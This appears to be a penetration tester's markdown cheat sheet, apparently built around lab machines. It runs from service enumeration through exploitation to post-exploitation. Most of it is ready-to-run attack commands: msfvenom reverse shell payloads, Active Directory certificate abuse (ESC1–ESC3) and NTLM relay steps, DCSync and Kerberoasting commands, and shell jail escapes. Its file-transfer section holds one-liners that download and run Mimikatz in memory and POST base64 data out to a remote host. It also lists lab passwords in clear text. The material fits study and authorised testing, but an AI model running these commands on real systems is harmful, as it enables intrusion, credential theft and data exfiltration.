# Information Gathering

## Active Directory

### tools
#### bloodhound
#### powerview

#### powershell
```
([ADSISearcher]"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))").FindAll()

net group "domain controllers" /domain

sudo nmap -Pn -T4 -p 389,636 --script ldap-rootdse <domain-controller-ip> | grep dnsHostName | sort -u
```

### ACL Enumeration
```
accesschk.exe /accepteula (always do this first!!!!!)
accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)
accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
accesschk.exe -ucqv [service_name]
#Find ALL weak folder permissions, per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwqs Users c:*.*
accesschk.exe -uwqs "Authenticated Users" c:*.*
```
## Application Enumeration

## Service Enumeration

### fping & nmap
```
fping -asgq X.X.X.X/24 | tee pingsweep
for i in ${cat pingsweep}; do nmap -sC -sV -sT -Pn -p- $i -oA $i.tcp; done
```
### DNS (53)
```
# NS request to the specific nameserver.
dig ns <domain.tld> @<nameserver>

# ANY request to the specific nameserver
dig any <domain.tld> @<nameserver>

# AXFR request to the specific nameserver.
dig axfr <domain.tld> @<nameserver>
```

### FTP (21)
```
ftp anonymous@$IP
```
### IPMI (623)
```
# IPMI version detection
msf6 auxiliary(scanner/ipmi/ipmi_version)

# Dump IPMI hashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)
```
### Kerberos (88)

### MSSQL (1433, 1432, 2433)
```
impacket-mssqlclient <user>@<FQDN/IP> -windows-auth
```
### MySQL (3306)

### NFS (2049)
```
# Show available NFS shares
showmount -e <IP>

# Mount the specific NFS share.umount ./target-NFS
mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock
```
### Oracle TNS (1521)

### IMAP POP3 (110,995)
```
# Log in to the IMAPS service using cURL
curl -k 'imaps://<FQDN/IP>' --user <user>:<password>

# Connect to the IMAPS service
openssl s_client -connect <FQDN/IP>:imaps

# Connect to the POP3s service
openssl s_client -connect <FQDN/IP>:pop3s
```
### R-Service (512, 513, 514)

### RDP (3389)

### RPC (135)
```
# Anonymous connection (-N=no pass)
rpcclient -U “” -N <ip>

# Connection with user
rpcclient -U “user” <ip>

# Get information about the DC
srvinfo

# Get information about objects such as groups (enum*)
enumdomains
enumdomgroups
enumalsgroups builtin

# Try to get domain password policy
getdompwinfo

# Try to enumerate different truste domains
dsr_enumtrustdom

# Get username for a defined user ?
getusername

# Query user, group etc informations
queryuser RID
querygroupmem519
queryaliasmem builtin 0x220

# Query info policy
lsaquery

# Convert SID to names
lookupsids SID
```
### Rsync (873)

### SMB (139, 445)
```
smbclient -N -L \\\\10.129.229.17

smbmap -u '' -p '' -H 10.129.229.17 -r
```
### SMTP (25, 465, 587)
```
smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t username
```
### SNMP (512, 162, 10161, 1016)
```
# Querying OIDs using snmpwalk
snmpwalk -v2c -c <community string> <FQDN/IP>

# Bruteforcing community strings of the SNMP service.
onesixtyone -c community-strings.list <FQDN/IP>

# Bruteforcing SNMP service OIDs.
braa <community string>@<FQDN/IP>:.1.*
```
### SSH (22)
```
# Enforce password-based authentication
ssh <user>@<FQDN/IP> -o PreferredAuthentications=password
```
### TFTP (69)

### WinRM (5985, 5986)
```
evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```

## Tools

## Web Enumeration
```
nikto -h $URL -C all

ffuf -w /opt/tools/SecLists/Discovery/Web-Content/raft-large-files.txt:FUZZ -u $URL/FUZZ -c

ffuf -w /opt/tools/SecLists/Discovery/Web-Content/raft-large-directories.txt:FUZZ -u $URL/FUZZ -c

ffuf -w /opt/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u $URL -H "HOST: FUZZ.domain.htb" -c
```

`-recursion -recursion-depth 1`
# Pre-Exploitation

## Shells

### Escape Shell Jail

1)From ssh > ssh username@IP - t "/bin/sh" or "/bin/bash"
2)From ssh2 > ssh username@IP -t "bash --noprofile"
3)From ssh3 > ssh username@IP -t "() { :; }; /bin/bash" (shellshock)
4)From ssh4 > ssh -o ProxyCommand="sh -c /tmp/yourfile.sh"
127.0.0.1 (SUID)
5)From git > git help status > you can run it then !/bin/bash
6)From pico > pico -s "/bin/bash" then you can write /bin/bash and
then CTRL + T
7)From zip > zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c
/bin/bash"
8)From tar > tar cf /dev/null testfile --checkpoint=1 --checkpoint-
action=exec=/bin/bash
## Upgrade shell with Python
```session
python -c 'import pty; pty.spawn("/bin/bash")'
```
OR
```session
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Get me colors and an alias
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
```

Ctrl + Z [Background Process]

```session
stty raw -echo ; fg ; reset
stty columns 200 rows 200
```

## Reverse Shells

### No-Meterpreter

#### Windows
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=1337 -f exe -o reverse.exe
```
#### Linux
```
msfvenom -p linux/x64/shell_reverse_tcp lhost=10.10.15.64 lport=4444 -f elf > shell
```
#### PHP
```bash
msfvenom -p php/reverse_php LHOST=192.168.49.57 LPORT=443 -f raw -o shell.php
```
## Tools

### msfconsole

### msfvenom

### searchsploit

## Password List Generation

# Exploitation

## Active Directory Attacks

#### AD CS
```
certipy-ad find -u -p -target 'ca.domain.com' /vulnerable
```

##### ESC 1
Domain escalation via No Issuance Requirements + Enrollable Client Authentication/Smart Card Logon OID templates + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
```
msf > use auxiliary/admin/dcerpc/icpr_cert
set CA daforest-WIN-BR0CCBA815B-CA
set CERT_TEMPLATE ESC1-Template
set RHOSTS 172.30.239.85
set SMBDomain DAFOREST
set SMBPass normalpass
set SMBUser normaluser
set ALT_SID S-1-5-21-3402587289-1488798532-3618296993-1000
set ALT_UPN Administrator@daforest.com
run
```
We can then use the `kerberos/get_ticket` module to gain a Kerberos ticket granting ticket (TGT) as the `Administrator` domain administrator.
##### ESC 2
Domain escalation via No Issuance Requirements + Enrollable Any Purpose EKU or no EKU
```
# step 1
msf > use auxiliary/admin/dcerpc/icpr_cert
set RHOSTS 172.30.239.85
set CA daforest-WIN-BR0CCBA815B-CA
set CERT_TEMPLATE ESC2-Template
set SMBDomain DAFOREST
set SMBPass normalpass
set SMBUser normaluser
run
loot

#step 2
set ON_BEHALF_OF DAFOREST\\Administrator
set PFX /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx
set CERT_TEMPLATE User
run
loot
```
We can then use the `kerberos/get_ticket` module to gain a Kerberos ticket granting ticket (TGT) as the `Administrator` domain administrator.
##### ESC 3
Domain escalation via No Issuance Requirements + Certificate Request Agent EKU + no enrollment agent restrictions
```
#step 1
msf > use auxiliary/admin/dcerpc/icpr_cert
set SMBUser normaluser
set SMBPass normalpass
set SMBDomain DAFOREST
set RHOSTS 172.30.239.85
set CA daforest-WIN-BR0CCBA815B-CA
set CERT_TEMPLATE ESC3-Template1
run

# step 2
msf auxiliary(admin/dcerpc/icpr_cert) > set PFX /home/gwillcox/.msf4/loot/20221216174221_default_unknown_windows.ad.cs_027866.pfx
set ON_BEHALF_OF DAFOREST\\Administrator
show options
```
##### ESC 4
Domain escalation via misconfigured certificate template access control

##### ESC 5
Domain escalation via vulnerable PKI AD Object Access Control
##### ESC 6
Domain escalation via the EDITF_ATTRIBUTESUBJECTALTNAME2 setting on CAs + No Manager Approval + Enrollable Client Authentication/Smart Card Logon OID templates

##### ESC 7
Vulnerable Certificate Authority Access Control

##### ESC 8
NTLM Relay to AD CS HTTP Endpoints
```
# coerce NTLM hash from vulnerable system
coercer coerce 

petitpotam.py 

# relay hash to CA
impacket-ntlmrelayx -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs

certipy-ad -template 'DomainController'

```

##### ESC 9
No Security Extension - CT_FLAG_NO_SECURITY_EXTENSION flag set in `msPKI-EnrollmentFlag`. Also `StrongCertificateBindingEnforcement` not set to 2 or `CertificateMappingMethods` contains `UPN` flag.

##### ESC 10
Weak Certificate Mappings - `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel CertificateMappingMethods` contains `UPN` bit aka `0x4` or `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc StrongCertificateBindingEnforcement` is set to `0`.
##### ESC 11
 Relaying NTLM to ICPR - Relaying NTLM authentication to unprotected RPC interface is allowed due to lack of the `IF_ENFORCEENCRYPTICERTREQUEST` flag on `Config.CA.Interface.Flags`.
##### ESC 12
A user with shell access to a CA server using a YubiHSM2 hardware security module can access the CA’s private key.
##### ESC 13
Domain escalation via issuance policies with group links.
##### ESC 14
Explicit certificate mappings through `altSecurityIdentities` write access abuse
##### ESC 15
Domain escalation via No Issuance Requirements + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + Policy OID manipulation
##### ESC 16
Security Extension Disabled on CA (Globally)
#### ACL Abuse

#### LLMNR Poisoning
```
# start repsonder
sudo responder -I eth0 -dwPv

# crack NTLMv2 hash
hashcat -m 5000 hash.txt rockyou.txt
```
#### SMB Relay
```
# edit responder config to disable HTTP and SMB
sudo vim /etc/responder/Responder.conf

# setup responder to poison
sudo responder -I eth0 -dwPv

# identify smb signing disabled
nmap -script=smb2-security-mode.nse -p445 $IP -Pn | grep not

# setup ntlm relay and spawn interactive shell
impacket-ntlmrelayx -tf targets.txt -smb2support -i
```
#### NTLM Relay
```
# setup responder to poison
sudo responder -I eth0 -dwPv

# setup ntlm relay and spawn interactive shell
impacket-ntlmrelayx -tf targets.txt -smb2support -i
```
#### MITM6
```
# setup relay
impacket-ntlmrelayx -6 -t ldaps://domainIP -wh fakewpad.domain.local -l lootme

# start attack
sudo mitm6 -d domain.local
```
#### ASREPRoasting

#### DCSync
```
impacket-secretsdump -just-dc 'svc_loanmgr:Moneymakestheworldgoround!'@10.10.10.175 -outputfile dcsync_hashes
```
#### GPO Password

#### Kerberoasting
```
# identify kerberoastable users
nxc ldap <target IP> -u j.fleischman -p 'J0elTHEM4n1990!' --kerberoasting kerberoastable --kdcHost 10.129.45.129

# list users with SPN
impacket-GetUserSPNs fluffy.htb/j.fleischman:'J0elTHEM4n1990!' -dc-ip 10.129.45.129 -request
```
#### Password Spraying 
```
./kerbrute_linux_amd64 passwordspray -d frizz.htb --dc frizzdc.frizz.htb frizz_users Jenni_Luvs_Magic23
```
#### PetitPotam
```
# attack petitpotam vulnerable target
PetitPotam.py -d {domain} {listener} {target}
```

#### PrintNightmare
```
CVE-2021-34527.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [destination port]] target share
```
#### SMB Hash Stealing

## Application Exploitation

## Binary Exploitation

## Service Exploitation

### DNS (53)

### FTP (21)

### IPMI (623)

### Kerberos (88)

### LDAP
```
ldapsearch -H ldap://10.10.10.100 -x -D "active\SVC_TGS" -W -b DC=active,DC=htb "(objectClass=user)" | grep sAMAccountName

ldapsearch -H ldap://10.10.10.100 -x -D "active\SVC_TGS" -W -b DC=active,DC=htb "(objectClass=computer)" | grep sAMAccountName

ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(! (useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
```
### MSSQL (1433, 1432, 2433)

### MySQL (3306)

### NFS (2049)

### Oracle TNS (1521)

### POP3 (110,995)

### R-Service (512, 513,, 514)

### RDP (3389)

may need to add the **--ntlm** flag to xfreerdp or specify domain with **/d:** flag  
#### CVE-2019-0708 (BlueKeep)
### RPC (135)

### Rsync (873)

### SMB (139, 445)
#### CVE-2017-0143 (EternalBlue)

### SMTP (25, 465, 587)

### SNMP (512, 162, 10161, 1016)

### SSH (22)

### TFTP (69)

### WinRM (5985, 5986)
## Tools

## Web Exploitation

# Post-Exploitation

## Linux

### Information Gathering
### Pillage & Recon
### Priv Esc

## Windows
### Information Gathering
```
# users and groups 
whoami /all
net users
net localgroup
net user <username>
net localgroup administrators

# network status
netstat -anoy
route print
arp -A

# firewall
netsh advfirewall firewall show rule name=all
netsh advfirewall firewall show rule name=inbound
netsh advfirewall firewall show rule name=outbounD
netsh firewall show state
netsh firewall show config

# scheduled tasks
schtasks /query /fo LIST /v > schtasks.txt
```
### Pillage & Recon
```
# finding files 
Get-ChildItem -Path C:\Users\Administrator\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.kdbx,*.exe,*.png,*.jpg,*.bin,*.zip,*.bak*,*.md -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\ -Include *.EXTENSION -File -Recurse -ErrorAction SilentlyContinue


# find passwords
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
dir /s pass == cred == vnc == .config
findstr /spin "password" .

# weak file permissions
accesschk.exe -uwqs Users c:*.*
accesschk.exe -uwqs "Authenticated Users" c:*.*

# windows shares
NET SHARE
NET USE
--> CREATE A SHARE ON WINDOWS FROM THE COMMAND LINE:
NET SHARE <sharename>=<drive/folderpath> /remark: "This is my share."
--> MOUNT A WINDOWS SHARE FROM THE COMMAND LINE:
NET USE Z: [\\COMPUTER_NAME\SHARE_NAME](file://COMPUTER_NAME/SHARE_NAME) /PERSISTENT:YES
--> UNMOUNT SHARE:
NET USE Z: /DELETE
--> DELETE A SHARE ENTIRLE
NET SHARE /DELETE

# ping sweep with powershell
1..20 | % {"192.168.1.$($_): $(Test-Connection -count 1 -comp 192.168.1.$($_) -quiet)"}
```
### Priv Esc

```powershell
Get-History
(Get-PSReadlineOption).HistorySavePath
```
## File Transfers

| **Command**                                                                                                        |
| ------------------------------------------------------------------------------------------------------------------ |
| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`                                            |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`                              |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`                                            |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`                                                   |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`                                                      |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`                   |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`                   |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`          |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`                                                 |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`                                                           |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` |
## Tools

# Lateral Movement

## Chisel
```
# start chisel server on kali
chisel server --socks5 --reverse -p 5555

# start chisel client on windows
.\chisel.exe client 192.168.49.94:5555 R:socks
```
## lingolo

# NetExec

# Tmux
```
# Start a new tmux session
tmux new -s <name>

# Start a new session or attach to an existing session named mysession
tmux new-session -A -s <name>

# List all sessions
tmux ls

# kill/delete session
tmux kill-session -t <name>

# kill all sessions but current
tmux kill-session -a

# attach to last session
tmux a
tmux a -t <name>

# start/stop logging with tmux logger
prefix + [Shift + P]

# split tmux pane vertically
prefix + [Shift + %}

# split tmux pane horizontally
prefix + [Shift + "]

# switch between tmux panes
prefix + [Shift + O]
```
